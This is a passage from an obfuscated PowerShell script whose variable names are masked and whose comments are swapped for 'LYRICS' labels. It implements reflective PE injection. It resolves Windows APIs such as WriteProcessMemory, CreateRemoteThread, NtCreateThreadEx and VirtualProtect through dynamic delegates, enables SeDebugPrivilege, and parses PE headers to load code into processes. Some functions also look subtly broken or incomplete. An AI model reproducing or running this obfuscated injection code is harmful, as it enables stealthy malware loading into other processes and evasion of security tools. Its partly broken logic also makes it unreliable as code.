# LYRICS203
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST016 -Value 0x20000000
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST017 -Value 0x40000000
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST018 -Value 0x80000000
# LYRICS204
# LYRICS205
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST019 -Value 0x04000000
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST020 -Value 0x4000
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST021 -Value 0x0002
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST022 -Value 0x2000
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST023 -Value 0x40
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST024 -Value 0x100
# LYRICS206
# LYRICS207
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST025 -Value 0x8000
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST026 -Value 0x0008
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST027 -Value 0x0020
# LYRICS208
# LYRICS209
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST028 -Value 0x2
            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST029 -Value 0x3f0
# LYRICS210
            return $VAR0041
        }
# LYRICS211
        Function FUN003 {
# LYRICS212
# LYRICS213
            $VAR0042 = New-Object System.Object
# LYRICS214
            $VAR0043 = FUN012 $VAR0302 $VAR0315
            $VAR0044 = FUN011 @($VAR095, [UIntPtr], [UInt32], [UInt32]) ($VAR095)
# LYRICS215
# LYRICS216
            $VAR0045 = $VAR099::$VAR096($VAR0043, $VAR0044)
            $VAR0042 | Add-Member NoteProperty -Name FUN031 -Value $VAR0045
# LYRICS217
            $VAR0046 = FUN012 $VAR0302 $VAR0318
            $VAR0047 = FUN011 @($VAR095, $VAR095, [UIntPtr], [UInt32], [UInt32]) ($VAR095)
# LYRICS218
            $VAR0048 = $VAR099::$VAR096($VAR0046, $VAR0047)
# LYRICS219
# LYRICS220
            $VAR0042 | Add-Member NoteProperty -Name FUN032 -Value $VAR0048
# LYRICS221
            $VAR0049 = FUN012 $VAR0309 "memcpy"
            $VAR0050 = FUN011 @($VAR095, $VAR095, [UIntPtr]) ($VAR095)
            $VAR0051 = $VAR099::$VAR096($VAR0049, $VAR0050)
# LYRICS222
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN033 -Value $VAR0051
# LYRICS223
            $VAR0052 = FUN012 $VAR0309 "memset"
            $VAR0053 = FUN011 @($VAR095, [Int32], $VAR095) ($VAR095)
# LYRICS224
            $VAR0054 = $VAR099::$VAR096($VAR0052, $VAR0053)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN034 -Value $VAR0054
# LYRICS225
# LYRICS226
            $VAR0055 = FUN012 $VAR0302 $VAR0329
            $VAR0056 = FUN011 @([String]) ($VAR095)
# LYRICS227
            $VAR0057 = $VAR099::$VAR096($VAR0055, $VAR0056)
# LYRICS228
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN035 -Value $VAR0057
# LYRICS229
            $VAR0058 = FUN012 $VAR0302 $VAR0312
# LYRICS230
            $VAR0059 = FUN011 @($VAR095, [String]) ($VAR095)
            $VAR0060 = $VAR099::$VAR096($VAR0058, $VAR0059)
# LYRICS231
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN036 -Value $VAR0060
# LYRICS232
            $VAR0061 = FUN012 $VAR0302 $VAR0312 
            $VAR0062 = FUN011 @($VAR095, $VAR095) ($VAR095)
# LYRICS233
            $VAR0063 = $VAR099::$VAR096($VAR0061, $VAR0062)
# LYRICS234
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN037 -Value $VAR0063
# LYRICS235
            $VAR0064 = FUN012 $VAR0302 "VirtualFree"
            $VAR0065 = FUN011 @($VAR095, [UIntPtr], [UInt32]) ([Bool])
            $VAR0066 = $VAR099::$VAR096($VAR0064, $VAR0065)
# LYRICS236
# LYRICS237
            $VAR0042 | Add-Member NoteProperty -Name FUN038 -Value $VAR0066
# LYRICS238
            $VAR0067 = FUN012 $VAR0302 "VirtualFreeEx"
# LYRICS239
            $VAR0068 = FUN011 @($VAR095, $VAR095, [UIntPtr], [UInt32]) ([Bool])
            $VAR0069 = $VAR099::$VAR096($VAR0067, $VAR0068)
# LYRICS240
            $VAR0042 | Add-Member NoteProperty -Name FUN039 -Value $VAR0069
# LYRICS241
            $VAR0070 = FUN012 $VAR0302 "VirtualProtect"
# LYRICS242
            $VAR0071 = FUN011 @($VAR095, [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
# LYRICS243
            $VAR0072 = $VAR099::$VAR096($VAR0070, $VAR0071)
            $VAR0042 | Add-Member NoteProperty -Name FUN040 -Value $VAR0072
# LYRICS244
            $VAR0073 = FUN012 $VAR0302 "GetModuleHandleA"
# LYRICS245
            $VAR0074 = FUN011 @([String]) ($VAR095)
# LYRICS246
            $VAR0075 = $VAR099::$VAR096($VAR0073, $VAR0074)
            $VAR0042 | Add-Member NoteProperty -Name FUN041 -Value $VAR0075
# LYRICS247
            $VAR0076 = FUN012 $VAR0302 "FreeLibrary"
# LYRICS248
            $VAR0077 = FUN011 @($VAR095) ([Bool])
            $VAR0078 = $VAR099::$VAR096($VAR0076, $VAR0077)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN042 -Value $VAR0078
# LYRICS249
            $VAR0079 = FUN012 $VAR0302 "OpenProcess"
# LYRICS250
            $VAR0080 = FUN011 @([UInt32], [Bool], [UInt32]) ($VAR095)
            $VAR0081 = $VAR099::$VAR096($VAR0079, $VAR0080)
# LYRICS251
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN043 -Value $VAR0081
# LYRICS252
            $VAR0082 = FUN012 $VAR0302 "WaitForSingleObject"
            $VAR0083 = FUN011 @($VAR095, [UInt32]) ([UInt32])
            $VAR0084 = $VAR099::$VAR096($VAR0082, $VAR0083)
# LYRICS253
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN044 -Value $VAR0084
# LYRICS254
            $VAR0085 = FUN012 $VAR0302 "WriteProcessMemory"
            $VAR0086 = FUN011 @($VAR095, $VAR095, $VAR095, [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
# LYRICS255
            $VAR0087 = $VAR099::$VAR096($VAR0085, $VAR0086)
# LYRICS256
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN045 -Value $VAR0087
# LYRICS257
            $VAR0088 = FUN012 $VAR0302 "ReadProcessMemory"
# LYRICS258
            $VAR0089 = FUN011 @($VAR095, $VAR095, $VAR095, [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
            $VAR0090 = $VAR099::$VAR096($VAR0088, $VAR0089)
# LYRICS259
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN046 -Value $VAR0090
# LYRICS260
            $VAR0091 = FUN012 $VAR0302 "CreateRemoteThread"
# LYRICS261
            $VAR0092 = FUN011 @($VAR095, $VAR095, [UIntPtr], $VAR095, $VAR095, [UInt32], $VAR095) ($VAR095)
            $VAR0093 = $VAR099::$VAR096($VAR0091, $VAR0092)
# LYRICS262
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN047 -Value $VAR0093
# LYRICS263
            $VAR0094 = FUN012 $VAR0302 "GetExitCodeThread"
# LYRICS264
# LYRICS265
            $VAR0095 = FUN011 @($VAR095, [Int32].MakeByRefType()) ([Bool])
# LYRICS266
            $VAR0096 = $VAR099::$VAR096($VAR0094, $VAR0095)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN048 -Value $VAR0096
# LYRICS267
            $VAR0097 = FUN012 $VAR0306 "OpenThreadToken"
# LYRICS268
            $VAR0098 = FUN011 @($VAR095, [UInt32], [Bool], $VAR095.MakeByRefType()) ([Bool])
            $VAR0099 = $VAR099::$VAR096($VAR0097, $VAR0098)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN049 -Value $VAR0099
# LYRICS269
            $VAR0100 = FUN012 $VAR0302 "GetCurrentThread"
# LYRICS270
            $VAR0101 = FUN011 @() ($VAR095)
# LYRICS271
            $VAR0102 = $VAR099::$VAR096($VAR0100, $VAR0101)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN050 -Value $VAR0102
# LYRICS272
            $VAR0103 = FUN012 $VAR0306 "AdjustTokenPrivileges"
# LYRICS273
            $VAR0104 = FUN011 @($VAR095, [Bool], $VAR095, [UInt32], $VAR095, $VAR095) ([Bool])
            $VAR0105 = $VAR099::$VAR096($VAR0103, $VAR0104)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN051 -Value $VAR0105
# LYRICS274
            $VAR0106 = FUN012 $VAR0306 "LookupPrivilegeValueA"
# LYRICS275
            $VAR0107 = FUN011 @([String], [String], $VAR095) ([Bool])
# LYRICS276
            $VAR0108 = $VAR099::$VAR096($VAR0106, $VAR0107)
# LYRICS277
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN052 -Value $VAR0108
# LYRICS278
            $VAR0109 = FUN012 $VAR0306 "ImpersonateSelf"
            $VAR0110 = FUN011 @([Int32]) ([Bool])
# LYRICS279
            $VAR0111 = $VAR099::$VAR096($VAR0109, $VAR0110)
# LYRICS280
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN053 -Value $VAR0111
# LYRICS281
# LYRICS282
            if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6, 0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6, 2))) {
# LYRICS283
                $VAR0112 = FUN012 "NtDll.dll" "NtCreateThreadEx"
# LYRICS284
                $VAR0113 = FUN011 @($VAR095.MakeByRefType(), [UInt32], $VAR095, $VAR095, $VAR095, $VAR095, [Bool], [UInt32], [UInt32], [UInt32], $VAR095) ([UInt32])
                $VAR0114 = $VAR099::$VAR096($VAR0112, $VAR0113)
# LYRICS285
                $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN054 -Value $VAR0114
            }
# LYRICS286
            $VAR0115 = FUN012 $VAR0302 "IsWow64Process"
# LYRICS287
            $VAR0116 = FUN011 @($VAR095, [Bool].MakeByRefType()) ([Bool])
            $VAR0117 = $VAR099::$VAR096($VAR0115, $VAR0116)
# LYRICS288
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN055 -Value $VAR0117
# LYRICS289
            $VAR0118 = FUN012 $VAR0302 "CreateThread"
# LYRICS290
            $VAR0119 = FUN011 @($VAR095, $VAR095, $VAR095, $VAR095, [UInt32], [UInt32].MakeByRefType()) ($VAR095)
# LYRICS291
            $VAR0120 = $VAR099::$VAR096($VAR0118, $VAR0119)
            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN056 -Value $VAR0120
# LYRICS292
            return $VAR0042
        }
# LYRICS293
# LYRICS294
# LYRICS295
# LYRICS296
        Function FUN004 {
# LYRICS297
# LYRICS298
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Int64]
                $VAR0121,
# LYRICS299
                [Parameter(Position = 1, Mandatory = $true)]
                [Int64]
                $VAR0122
            )
# LYRICS300
            [Byte[]]$VAR0121Bytes = [BitConverter]::GetBytes($VAR0121)
            [Byte[]]$VAR0122Bytes = [BitConverter]::GetBytes($VAR0122)
# LYRICS301
            [Byte[]]$VAR0123 = [BitConverter]::GetBytes([UInt64]0)
# LYRICS302
            if ($VAR0121Bytes.Count -eq $VAR0122Bytes.Count) {
                $VAR0124 = 0
# LYRICS303
                for ($i = 0; $i -lt $VAR0121Bytes.Count; $i++) {
# LYRICS304
# LYRICS305
                    $Val = $VAR0121Bytes[$i] - $VAR0124
# LYRICS306
                    if ($Val -lt $VAR0122Bytes[$i]) {
                        $Val += 256
# LYRICS307
                        $VAR0124 = 1
                    }
                    else {
# LYRICS308
                        $VAR0124 = 0
                    }
# LYRICS309
# LYRICS310
                    [UInt16]$Sum = $Val - $VAR0122Bytes[$i]
# LYRICS311
                    $VAR0123[$i] = $Sum -band 0x00FF
# LYRICS312
                }
            }
            else {
                Throw "ERROR01"
            }
# LYRICS313
            return [BitConverter]::ToInt64($VAR0123, 0)
        }
# LYRICS314
        Function FUN005 {
# LYRICS315
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Int64]
                $VAR0121,
# LYRICS316
                [Parameter(Position = 1, Mandatory = $true)]
                [Int64]
                $VAR0122
            )
# LYRICS317
            [Byte[]]$VAR0121Bytes = [BitConverter]::GetBytes($VAR0121)
# LYRICS318
            [Byte[]]$VAR0122Bytes = [BitConverter]::GetBytes($VAR0122)
            [Byte[]]$VAR0123 = [BitConverter]::GetBytes([UInt64]0)
# LYRICS319
            if ($VAR0121Bytes.Count -eq $VAR0122Bytes.Count) {
# LYRICS320
                $VAR0124 = 0
                for ($i = 0; $i -lt $VAR0121Bytes.Count; $i++) {
# LYRICS321
# LYRICS322
                    [UInt16]$Sum = $VAR0121Bytes[$i] + $VAR0122Bytes[$i] + $VAR0124
# LYRICS323
                    $VAR0123[$i] = $Sum -band 0x00FF
# LYRICS324
                    if (($Sum -band 0xFF00) -eq 0x100) {
# LYRICS325
                        $VAR0124 = 1
                    }
                    else {
# LYRICS326
                        $VAR0124 = 0
                    }
                }
            }
            else {
                Throw "ERROR02"
            }
# LYRICS327
            return [BitConverter]::ToInt64($VAR0123, 0)
        }
# LYRICS328
        Function FUN006 {
# LYRICS329
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Int64]
                $VAR0121,
# LYRICS330
                [Parameter(Position = 1, Mandatory = $true)]
                [Int64]
                $VAR0122
            )
# LYRICS331
            [Byte[]]$VAR0121Bytes = [BitConverter]::GetBytes($VAR0121)
# LYRICS332
            [Byte[]]$VAR0122Bytes = [BitConverter]::GetBytes($VAR0122)
# LYRICS333
            if ($VAR0121Bytes.Count -eq $VAR0122Bytes.Count) {
                for ($i = $VAR0121Bytes.Count - 1; $i -ge 0; $i--) {
# LYRICS334
                    if ($VAR0121Bytes[$i] -gt $VAR0122Bytes[$i]) {
# LYRICS335
                        return $true
                    }
                    elseif ($VAR0121Bytes[$i] -lt $VAR0122Bytes[$i]) {
# LYRICS336
                        return $false
                    }
                }
            }
            else {
                Throw "ERROR03"
            }
# LYRICS337
            return $false
        }
# LYRICS338
# LYRICS339
        Function FUN007 {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [UInt64]
# LYRICS340
                $VAR0123
            )
# LYRICS341
            [Byte[]]$VAR0123Bytes = [BitConverter]::GetBytes($VAR0123)
# LYRICS342
            return ([BitConverter]::ToInt64($VAR0123Bytes, 0))
        }
# LYRICS343
# LYRICS344
        Function FUN008 {
# LYRICS345
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                $VAR0123 
            )
# LYRICS346
            $VAR0123Size = $VAR099::SizeOf([Type]$VAR0123.GetType()) * 2
# LYRICS347
            $VAR0124 = "0x{0:X$($VAR0123Size)}" -f [Int64]$VAR0123 
# LYRICS348
            return $VAR0124
        }
# LYRICS349
        Function FUN009 {
# LYRICS350
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [String]
                $VAR0125,
# LYRICS351
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR0126,
# LYRICS352
                [Parameter(Position = 2, Mandatory = $true)]
                [IntPtr]
                $VAR0127,
# LYRICS353
                [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
                [IntPtr]
                $Size
            )
# LYRICS354
            [IntPtr]$VAR0128 = [IntPtr](FUN005 ($VAR0127) ($Size))
# LYRICS355
# LYRICS356
            $VAR0128 = $VAR0126.CONST038
# LYRICS357
# LYRICS358
        }
# LYRICS359
        Function FUN010 {
# LYRICS360
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Byte[]]
                $Bytes,
# LYRICS361
                [Parameter(Position = 1, Mandatory = $true)]
                [IntPtr]
                $VAR0129
            )
# LYRICS362
            for ($VAR0130 = 0; $VAR0130 -lt $Bytes.Length; $VAR0130++) {
# LYRICS363
                $VAR099::WriteByte($VAR0129, $VAR0130, $Bytes[$VAR0130])
            }
        }
# LYRICS364
# LYRICS365
        Function FUN011 {
# LYRICS366
            Param
            (
                [OutputType([Type])]
# LYRICS367
                [Parameter( Position = 0)]
                [Type[]]
                $Parameters = (New-Object Type[](0)),
# LYRICS368
                [Parameter( Position = 1 )]
                [Type]
                $ReturnType = [Void]
            )
# LYRICS369
            $Domain = [AppDomain]::CurrentDomain
            $VAR0131 = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
# LYRICS370
            $VAR013 = $Domain.DefineDynamicAssembly($VAR0131, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
            $VAR014 = $VAR013.DefineDynamicModule('InMemoryModule', $false)
            $VAR011 = $VAR014.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
# LYRICS371
            $VAR0132 = $VAR011.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
            $VAR0132.SetImplementationFlags('Runtime, Managed')
# LYRICS372
            $VAR0133 = $VAR011.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
# LYRICS373
            $VAR0133.SetImplementationFlags('Runtime, Managed')
# LYRICS374
            Write-Output $VAR011.CreateType()
        }
# LYRICS375
# LYRICS376
# LYRICS377
        Function FUN012 {
# LYRICS378
            Param
            (
                [OutputType([IntPtr])]
# LYRICS379
                [Parameter( Position = 0, Mandatory = $True )]
                [String]
                $Module,
# LYRICS380
                [Parameter( Position = 1, Mandatory = $True )]
                [String]
                $VAR0139
            )
# LYRICS381
# LYRICS382
            $VAR0134 = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
# LYRICS383
            $VAR0135 = $VAR0134.GetType('Microsoft.Win32.UnsafeNativeMethods')
# LYRICS384
# LYRICS385
            $VAR0075 = $VAR0135.GetMethod('GetModuleHandle')
# LYRICS386
            $VAR0060 = $VAR0135.GetMethods() | Where { $_.Name -eq $VAR0312 } | Select-Object -first 1
# LYRICS387
# LYRICS388
            $VAR0136 = $VAR0075.Invoke($null, @($Module))
# LYRICS389
# LYRICS390
            try {
                $VAR0137 = New-Object IntPtr
                $VAR0138 = New-Object System.Runtime.InteropServices.HandleRef($VAR0137, $VAR0136)
# LYRICS391
                Write-Output $VAR0060.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$VAR0138, $VAR0139))
            }
            catch {
# LYRICS392
                Write-Output $VAR0060.Invoke($null, @($VAR0136, $VAR0139))
# LYRICS393
            }
        }
# LYRICS394
        Function FUN013 {
# LYRICS395
            Param(
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR0042,
# LYRICS396
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $VAR010,
# LYRICS397
                [Parameter(Position = 3, Mandatory = $true)]
                [System.Object]
                $VAR0041
            )
# LYRICS398
            [IntPtr]$VAR0141 = $VAR0042.FUN050.Invoke()
# LYRICS399
            if ($VAR0141 -eq $VAR095::Zero) {
# LYRICS400
                Throw "ERROR03"
            }
# LYRICS401
            [IntPtr]$VAR0142 = $VAR095::Zero
# LYRICS402
            [Bool]$VAR0144 = $VAR0042.FUN049.Invoke($VAR0141, $VAR0041.CONST026 -bor $VAR0041.CONST027, $false, [Ref]$VAR0142)
# LYRICS403
            if ($VAR0144 -eq $false) {
                $VAR0148 = $VAR099::GetLastWin32Error()
# LYRICS404
                if ($VAR0148 -eq $VAR0041.CONST029) {
# LYRICS405
                    $VAR0144 = $VAR0042.FUN053.Invoke(3)
# LYRICS406
                    if ($VAR0144 -eq $false) {
                        Throw "ERROR04"
                    }
# LYRICS407
                    $VAR0144 = $VAR0042.FUN049.Invoke($VAR0141, $VAR0041.CONST026 -bor $VAR0041.CONST027, $false, [Ref]$VAR0142)
# LYRICS408
                    if ($VAR0144 -eq $false) {
                        Throw "ERROR05"
                    }
                }
                else {
                    Throw "ERROR06: $VAR0148"
                }
            }
# LYRICS409
            [IntPtr]$VAR0143 = $VAR099::AllocHGlobal($VAR099::SizeOf([Type]$VAR010.CONST163))
# LYRICS410
            $VAR0144 = $VAR0042.FUN052.Invoke($null, "SeDebugPrivilege", $VAR0143)
# LYRICS411
            if ($VAR0144 -eq $false) {
                Throw "ERROR07"
            }
# LYRICS412
            [UInt32]$VAR0145 = $VAR099::SizeOf([Type]$VAR010.CONST167)
# LYRICS413
            [IntPtr]$VAR0146 = $VAR099::AllocHGlobal($VAR0145)
            $VAR0147 = $VAR099::PtrToStructure($VAR0146, [Type]$VAR010.CONST167)
# LYRICS414
            $VAR0147.CONST168 = 1
            $VAR0147.CONST169.CONST163 = $VAR099::PtrToStructure($VAR0143, [Type]$VAR010.CONST163)
# LYRICS415
            $VAR0147.CONST169.Attributes = $VAR0041.CONST028
# LYRICS416
            $VAR099::StructureToPtr($VAR0147, $VAR0146, $true)
# LYRICS417
            $VAR0144 = $VAR0042.FUN051.Invoke($VAR0142, $false, $VAR0146, $VAR0145, $VAR095::Zero, $VAR095::Zero)
# LYRICS418
            $VAR0148 = $VAR099::GetLastWin32Error() 
# LYRICS419
# LYRICS420
            if (($VAR0144 -eq $false) -or ($VAR0148 -ne 0)) {
# LYRICS421
            }
# LYRICS422
            $VAR099::FreeHGlobal($VAR0146)
        }
# LYRICS423
        Function FUN014 {
# LYRICS424
            Param(
                [Parameter(Position = 1, Mandatory = $true)]
                [IntPtr]
                $VAR0151,
# LYRICS425
                [Parameter(Position = 2, Mandatory = $true)]
                [IntPtr]
                $VAR0127,
# LYRICS426
                [Parameter(Position = 3, Mandatory = $false)]
                [IntPtr]
                $VAR0152 = $VAR095::Zero,
# LYRICS427
                [Parameter(Position = 4, Mandatory = $true)]
                [System.Object]
                $VAR0042
            )
# LYRICS428
            [IntPtr]$VAR0149 = $VAR095::Zero
# LYRICS429
            $VAR0150 = [Environment]::OSVersion.Version
# LYRICS430
# LYRICS431
            if (($VAR0150 -ge (New-Object 'Version' 6, 0)) -and ($VAR0150 -lt (New-Object 'Version' 6, 2))) {
# LYRICS432
# LYRICS433
                $RetVal = $VAR0042.FUN054.Invoke([Ref]$VAR0149, 0x1FFFFF, $VAR095::Zero, $VAR0151, $VAR0127, $VAR0152, $false, 0, 0xffff, 0xffff, $VAR095::Zero)
# LYRICS434
# LYRICS435
                $VAR0153 = $VAR099::GetLastWin32Error()
# LYRICS436
                if ($VAR0149 -eq $VAR095::Zero) {
# LYRICS437
                    Throw "ERROR63: $RetVal. $VAR0153"
                }
            }
# LYRICS438
            else {
# LYRICS439
                $VAR0149 = $VAR0042.FUN047.Invoke($VAR0151, $VAR095::Zero, [UIntPtr][UInt64]0xFFFF, $VAR0127, $VAR0152, 0, $VAR095::Zero)
            }
# LYRICS440
            if ($VAR0149 -eq $VAR095::Zero) {
# LYRICS441
                Write-Error "ERROR64" -ErrorAction Stop
            }
# LYRICS442
            return $VAR0149
        }
# LYRICS443
        Function FUN015 {
# LYRICS444
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [IntPtr]
                $VAR0263,
# LYRICS445
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR010
            )
# LYRICS446
            $VAR0154 = New-Object System.Object
# LYRICS447
# LYRICS448
            $VAR0155 = $VAR099::PtrToStructure($VAR0263, [Type]$VAR010.CONST123)
# LYRICS449
# LYRICS450
            [IntPtr]$VAR0156 = [IntPtr](FUN005 ([Int64]$VAR0263) ([Int64][UInt64]$VAR0155.CONST141))
# LYRICS451
            $VAR0154 | Add-Member -MemberType NoteProperty -Name CONST030 -Value $VAR0156
# LYRICS452
            $VAR0157 = $VAR099::PtrToStructure($VAR0156, [Type]$VAR010.CONST03164)
# LYRICS453
# LYRICS454
            if ($VAR0157.Signature -ne 0x00004550) {
                throw "ERROR65"
            }
# LYRICS455
            if ($VAR0157.CONST122.Magic -eq 'CONST101') {
# LYRICS456
                $VAR0154 | Add-Member -MemberType NoteProperty -Name CONST031 -Value $VAR0157
# LYRICS457
                $VAR0154 | Add-Member -MemberType NoteProperty -Name CONST032 -Value $true
            }
            else {
                $VAR0158 = $VAR099::PtrToStructure($VAR0156, [Type]$VAR010.CONST03132)
# LYRICS458
                $VAR0154 | Add-Member -MemberType NoteProperty -Name CONST031 -Value $VAR0158
                $VAR0154 | Add-Member -MemberType NoteProperty -Name CONST032 -Value $false
            }
# LYRICS459
            return $VAR0154
        }
# LYRICS460
# LYRICS461
# LYRICS462
        Function FUN016 {
# LYRICS463
            Param(
                [Parameter( Position = 0, Mandatory = $true )]
                [Byte[]]
                $VAR001,
# LYRICS464
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR010
            )
# LYRICS465
            $VAR0126 = New-Object System.Object
# LYRICS466
# LYRICS467
            [IntPtr]$VAR0159 = $VAR099::AllocHGlobal($VAR001.Length)
# LYRICS468
            $VAR099::Copy($VAR001, 0, $VAR0159, $VAR001.Length) | Out-Null
# LYRICS469
# LYRICS470
            $VAR0154 = FUN015 -VAR0263 $VAR0159 -VAR010 $VAR010
# LYRICS471
# LYRICS472
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST032' -Value ($VAR0154.CONST032)
# LYRICS473
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'VAR0196' -Value ($VAR0154.CONST031.CONST122.CONST058)
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST033' -Value ($VAR0154.CONST031.CONST122.CONST033)
# LYRICS474
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST034' -Value ($VAR0154.CONST031.CONST122.CONST034)
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST035' -Value ($VAR0154.CONST031.CONST122.CONST035)
# LYRICS475
# LYRICS476
# LYRICS477
            $VAR099::FreeHGlobal($VAR0159)
# LYRICS478
            return $VAR0126
        }
# LYRICS479
# LYRICS480
# LYRICS481
# LYRICS482
        Function FUN017 {
# LYRICS483
            Param(
                [Parameter( Position = 0, Mandatory = $true)]
                [IntPtr]
                $VAR0263,
# LYRICS484
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR010,
# LYRICS485
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $VAR0041
            )
# LYRICS486
            if ($VAR0263 -eq $null -or $VAR0263 -eq $VAR095::Zero) {
# LYRICS487
                throw 'ERROR66'
            }
# LYRICS488
            $VAR0126 = New-Object System.Object
# LYRICS489
# LYRICS490
            $VAR0154 = FUN015 -VAR0263 $VAR0263 -VAR010 $VAR010
# LYRICS491
# LYRICS492
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'VAR0263' -Value $VAR0263
# LYRICS493
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST031' -Value ($VAR0154.CONST031)
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST1000' -Value ($VAR0154.CONST030) 
# LYRICS494
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST032' -Value ($VAR0154.CONST032)
            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST033' -Value ($VAR0154.CONST031.CONST122.CONST033)
# LYRICS495
            if ($VAR0126.CONST032 -eq $true) {
                [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.CONST1000) ($VAR099::SizeOf([Type]$VAR010.CONST03164)))
# LYRICS496
                $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST036 -Value $VAR0160
            }
            else {
                [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.CONST1000) ($VAR099::SizeOf([Type]$VAR010.CONST03132)))
# LYRICS497
                $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST036 -Value $VAR0160
            }
# LYRICS498
            if (($VAR0154.CONST031.CONST121.CONST067 -band $VAR0041.CONST022) -eq $VAR0041.CONST022) {
# LYRICS499
                $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST037 -Value 'Library'
            }
            elseif (($VAR0154.CONST031.CONST121.CONST067 -band $VAR0041.CONST021) -eq $VAR0041.CONST021) {
# LYRICS500
                $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST037 -Value 'Executable'
            }
            else {
                Throw "ERROR08"
            }
# LYRICS501
            return $VAR0126
        }
# LYRICS502
        Function FUN018 {
# LYRICS503
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [IntPtr]
                $VAR0161,
# LYRICS504
                [Parameter(Position = 1, Mandatory = $true)]
                [IntPtr]
                $VAR0162
            )
# LYRICS505
            $VAR0163 = $VAR099::SizeOf([Type][IntPtr])
# LYRICS506
# LYRICS507
            $VAR0164 = $VAR099::PtrToStringAnsi($VAR0162)
# LYRICS508
            $VAR0165 = [UIntPtr][UInt64]([UInt64]$VAR0164.Length + 1)
            $VAR0166 = $VAR0042.FUN032.Invoke($VAR0161, $VAR095::Zero, $VAR0165, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
# LYRICS509
            if ($VAR0166 -eq $VAR095::Zero) {
                Throw "ERROR09"
            }
# LYRICS510
            [UIntPtr]$VAR0167 = [UIntPtr]::Zero
# LYRICS511
            $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0166, $VAR0162, $VAR0165, [Ref]$VAR0167)
# LYRICS512
            if ($Success -eq $false) {
                Throw "ERROR10"
            }
            if ($VAR0165 -ne $VAR0167) {
                Throw "ERROR11"
            }
# LYRICS513
            $VAR0168 = $VAR0042.FUN041.Invoke($VAR0302)
# LYRICS514
